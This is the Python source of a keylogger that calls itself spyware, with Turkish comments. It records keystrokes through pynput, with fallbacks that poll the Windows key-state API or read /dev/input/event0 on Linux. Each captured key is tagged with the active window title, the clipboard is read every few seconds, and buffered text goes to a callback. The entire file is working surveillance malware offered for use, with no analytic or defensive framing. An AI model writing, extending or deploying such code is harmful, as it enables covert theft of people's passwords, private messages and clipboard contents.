#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
KANSER SPYWARE — Advanced Keylogger
Aktif pencere takibi + zaman damgasi + clipboard context
"""
import time, threading, os

class Keylogger:
    def __init__(self, buffer_size=50):
        self.buffer = []
        self.callback = None
        self.running = False
        self.current_window = ""
        self.last_clipboard = ""

    def start(self, callback):
        self.callback = callback
        self.running = True
        try:
            import pynput.keyboard
            self.listener = pynput.keyboard.Listener(on_press=self._on_press, on_release=self._on_release)
            self.listener.start()
            threading.Thread(target=self._flush_loop, daemon=True).start()
            threading.Thread(target=self._clipboard_loop, daemon=True).start()
            self.listener.join()
        except ImportError:
            # Fallback: basic keylogger using ctypes on Windows
            if os.name == "nt":
                self._win_keylogger()
            else:
                self._linux_keylogger()

    def _on_press(self, key):
        try:
            self.buffer.append({"key": key.char, "time": time.time(), "window": self._active_window()})
        except:
            self.buffer.append({"key": f"[{key}]", "time": time.time(), "window": self._active_window()})

    def _on_release(self, key): pass

    def _active_window(self):
        try:
            if os.name == "nt":
                import ctypes
                hwnd = ctypes.windll.user32.GetForegroundWindow()
                length = ctypes.windll.user32.GetWindowTextLengthW(hwnd)
                buf = ctypes.create_unicode_buffer(length + 1)
                ctypes.windll.user32.GetWindowTextW(hwnd, buf, length + 1)
                return buf.value
        except: pass
        return ""

    def _flush_loop(self):
        while self.running:
            time.sleep(5)
            self._flush()

    def _clipboard_loop(self):
        while self.running:
            time.sleep(3)
            try:
                import pyperclip
                text = pyperclip.paste()
                if text and text != self.last_clipboard and len(text) < 5000:
                    self.last_clipboard = text
                    if self.callback:
                        self.callback(f"[CLIPBOARD] {text[:200]}")
            except: pass

    def _flush(self):
        if self.buffer:
            text = "".join([b["key"] for b in self.buffer])
            window = self.buffer[-1]["window"] if self.buffer else ""
            self.buffer = []
            if self.callback and text:
                self.callback(text)

    def _win_keylogger(self):
        """Windows API keylogger (pynput olmadan)"""
        import ctypes
        from ctypes import wintypes
        user32 = ctypes.windll.user32

        while self.running:
            for vk in range(8, 256):
                if user32.GetAsyncKeyState(vk) & 0x8000:
                    try:
                        key = chr(vk) if 32 <= vk <= 126 else f"[VK{vk}]"
                        self.buffer.append({"key": key, "time": time.time(), "window": self._active_window()})
                        if len(self.buffer) >= 20:
                            self._flush()
                    except: pass
            time.sleep(0.01)

    def _linux_keylogger(self):
        """Linux keylogger (pynput olmadan)"""
        try:
            import struct
            with open("/dev/input/event0", "rb") as f:
                while self.running:
                    try:
                        data = f.read(24)
                        if data:
                            tv_sec, tv_usec, ev_type, code, value = struct.unpack("llHHI", data)
                            if ev_type == 1 and value == 1:
                                key = chr(code) if 32 <= code <= 126 else f"[{code}]"
                                self.buffer.append({"key": key, "time": time.time(), "window": ""})
                    except: pass
        except: pass

    def stop(self):
        self.running = False
        self._flush()

if __name__ == "__main__":
    k = Keylogger()
    k.start(lambda text: print(f"[KEYLOG]: {text}"))
